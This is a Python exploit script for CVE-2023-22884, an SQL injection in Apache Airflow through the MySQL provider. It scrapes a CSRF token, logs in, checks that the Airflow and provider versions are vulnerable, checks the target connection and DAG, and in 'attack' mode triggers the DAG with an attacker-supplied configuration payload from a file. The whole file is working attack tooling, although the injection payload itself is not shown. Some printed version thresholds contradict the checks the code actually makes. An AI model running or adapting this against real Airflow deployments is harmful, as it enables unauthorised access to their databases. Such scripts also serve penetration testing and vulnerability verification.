# @jakabakos
# version: 1.0
# Tested with Airflow 2.5.0 and MySQL provider 3.4.0
# REST API reference: https://airflow.apache.org/docs/apache-airflow/stable/stable-rest-api-ref.html

import argparse
import json
import re
import requests
from packaging import version

def get_csrf_token(url):
    response = requests.get(url + "/login/")
    pattern = r'<input(?:\s+(?:(?:type|name|id)\s*=\s*"[^"]*"\s*)+)?\s+value="([^"]+)">'
    csrf_token = re.search(pattern, response.text)
    initial_session_cookie = response.cookies.get('session')

    if csrf_token:
        print("[+] CSRF token found.")
        return initial_session_cookie, csrf_token.group(1)
    else:
        print("[-] CSRF token not found. Exiting...")
        exit(1)

def login(url, username, password, cookie, csrf_token):
    response = requests.post(
        url + "/login/",
        headers={
            "Content-Type":"application/x-www-form-urlencoded",
            "Cookie":f"session={cookie}"
        },
        data={"csrf_token": csrf_token, "username": username, "password": password}
    )

    if "Invalid login. Please try again." in response.text:
        print("[+] Login was not successful due to invalid credentials.")
        exit(1)

    elif response.status_code != 200:
        print("[-] Something went wrong with the login process.")

    elif "Set-Cookie" in response.headers:
        session_cookie = response.headers["Set-Cookie"].split(";")[0].split("=")[1]
        print(f"[+] Login was successful. Captured session cookie: {session_cookie}")
        return session_cookie

def verify_airflow_version(url, session_cookie):
    response = requests.get(
        url + "/home",
        headers={"Cookie": f"session={session_cookie}"}
    )

    version_str = re.search(r'v(\d+\.\d+\.\d+)', response.text)
    found_version = version_str.group(1)

    if found_version:
        print(f"[+] Airflow version found: {found_version}")
    else:
        print("[-] Airflow version not found. Exiting...")
        exit(1)

    if version.parse(found_version) <= version.parse("2.5.0"):
        print("[+] Version is vulnerable.")
    else:
        print("[-] Airflow version is not vulnerable. Version is above 2.4.0. Exiting...")
        exit(1)


def verify_mysql_provider(url, session_cookie):
    response = requests.get(
        f'{url}/api/v1/providers',
        headers={"Cookie": f"session={session_cookie}"})
    data = response.json()
    providers = data.get("providers", [])
    for provider in providers:
        if provider.get("package_name") == "apache-airflow-providers-mysql":
            if version.parse(provider.get("version")) <= version.parse("3.4.0"):
                print("[+] MySQL provider version is vulnerable.")
                return
            else:
                print("[-] MySQL provider version is not vulnerable. Exiting...")
                exit(1)
    print("[-] MySQL provider not found. Exiting...")
    exit(1)

def verify_connection_id(url, session_cookie, connection_id):
    # Check if provided connection ID is a string that means it's existing. Here we verify it's existence and its type
    if isinstance(connection_id, str):
        response = requests.get(
            f'{url}/api/v1/connections',
            headers={"Cookie": f"session={session_cookie}"}
        )
        connections = response.json().get("connections", [])

        found = False
        for conn in connections:
            if conn.get("connection_id") == connection_id:
                if conn.get("conn_type") == "mysql":
                    found = True
                else:
                    print("[-] The provided connection_id is not a 'mysql' type connection. Exiting...")
                    exit(1)
        if found:
            print("[+] Connection ID '{connection_id}' exists.")
            return
        else:
            print("[-] Submitted connection id does not exist. Exiting...")
            exit(1)

    # If the connection id not exists, trying to open it as a JSON that contains the data for the new connection.
    else:
        try:
            with open(connection_id, 'r') as f:
                conn_data = json.load(f)
            if not isinstance(conn_data, dict) or not all(key in conn_data for key in ["connection_id", "conn_type", "host", "login", "port", "password"]):
                print("[-] Invalid JSON format for connection data. Exiting...")
                exit(1)
            response = requests.post(
                url + "/connections",
                headers={"Cookie": f"session={session_cookie}"},
                json=conn_data)

            if response.status_code == 200:
                print(f"[+] Connection was successfully created with name {conn_data['connection_id']}.")
                print("[+] This connection id should be used by the vulnerable DAG.")
            else:
                print("[-] Failed to create the connection. Exiting...")
                exit(1)
        except FileNotFoundError:
            print("[-] The specified connection data file was not found. Exiting...")
            exit(1)
        except json.JSONDecodeError:
            print("[-] Failed to parse the JSON connection data. Exiting...")
            exit(1)

def verify_dag_id(url, session_cookie, dag_id):
    response = requests.get(f'{url}/api/v1/dags',
        headers={"Cookie": f"session={session_cookie}"})

    dags = response.json().get("dags", [])
    if any(dag.get("dag_id") == dag_id for dag in dags):
        print(f"[+] DAG id '{dag_id}' exists.")
    else:
        print("[-] DAG id does not exist. Exiting...")
        exit(1)

def trigger_dag(url, session_cookie, dag_id, file_path):
    endpoint = f"{url}/api/v1/dags/{dag_id}/dagRuns"
    headers = {
        "Cookie": f"session={session_cookie}",
        "accept": "application/json"
    }

    try:
        with open(file_path, 'r') as file:
            file_content = file.read()
            try:
                payload = json.loads(file_content)
            except json.JSONDecodeError:
                exit(0)
    except FileNotFoundError:
        print("File not found.")
        return None

    data = {"conf": payload}
    response = requests.post(endpoint, headers=headers, json=data)
    
    if response.status_code == 200 and response.json().get("state") == "queued":
        print("[+] DAG successfully triggered with the provided payload.")
    else:
        print("[-] Failed to trigger the DAG. Response:")
        print(json.dumps(response.json(), indent=4))
        exit(1)

def main():
    example_text = '''Examples:
    python3 exploit.py -u admin -p admin --host http://localhost:8080 --mode test -ci mysql -di bulk_load_from_file 
    python3 exploit.py -u admin -p admin --host http://localhost:8080 --mode attack -ci mysql -di bulk_load_from_file -dc dag_config.json
    '''
    parser = argparse.ArgumentParser(
        description="CVE-2023-22884 Apache Airflow SQLi exploit script",
        epilog=example_text,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-u", "--username", help="Airflow username.")
    parser.add_argument("-p", "--password", help="Airflow password.")
    parser.add_argument("-c", "--cookie", help="Authentication cookie.")
    parser.add_argument("--host", required=True, help="Host where the airflow is (format: http(s)://host:port).")
    parser.add_argument("-m", "--mode", required=True, choices=["test", "attack"], help="The mode of the script. Can be: 'test' or 'attack' mode")
    parser.add_argument("-ci", "--connection-id", help="The connection ID of the MySQL provider. Required in attack mode only. Submit a string if it's existing or a path to a JSON file if should be created.")
    parser.add_argument("-di", "--dag-id", help="The ID of the DAG to be exploited. Required in attack mode only.")
    parser.add_argument("-dc", "--dag-config-file", help="Path to a file that stores a the DAG config JSON.")
    
    # Examples:
    #   Running in test mode:    python3 exploit.py -u admin -p admin --host http://localhost:8080 --mode test -ci mysql -di bulk_load_from_file 
    #   Running in attack mode:  python3 exploit.py -u admin -p admin --host http://localhost:8080 --mode attack -ci mysql -di bulk_load_from_file -dc dag_config.json

    args = parser.parse_args()

    if (args.username and args.password) or args.cookie:
        url = args.host.rstrip("/")
        if not url.startswith("http"):
            print("[-] Invalid URL format. Please use 'http' or 'https' as the schema. Exiting...")
            exit(1)

        # Get the session cookie
        session_cookie = args.cookie
        if not session_cookie:
            initial_session_cookie, csrf_token = get_csrf_token(url)
            session_cookie = login(url, args.username, args.password, initial_session_cookie, csrf_token)

        if args.mode == "test":
            print("[+] Running in test mode.")
            # Verify airflow version is not greater than 2.5.0
            verify_airflow_version(url, session_cookie)

            # Verify MySQL provider version is not greater than 2.3.4
            verify_mysql_provider(url, session_cookie)

            # Verify the provided MySQL connection ID exists
            verify_connection_id(url, session_cookie, args.connection_id)

            # Verify if the DAG exists or not
            verify_dag_id(url, session_cookie, args.dag_id)
            
            print("[+] Exploit successfully finished in test mode. Application is potentially VULNERABLE.")
            exit(0)

        elif args.mode == "attack":
            print("[+] Running in attack mode.")
            trigger_dag(url, session_cookie, args.dag_id, args.dag_config_file)
            print("[+] Exploit successfully finished in attack mode.")
    else:
        print("[-] Either username along with password or the authentication cookie is required. Exiting...")
        exit(1)

if __name__ == "__main__":
    main()

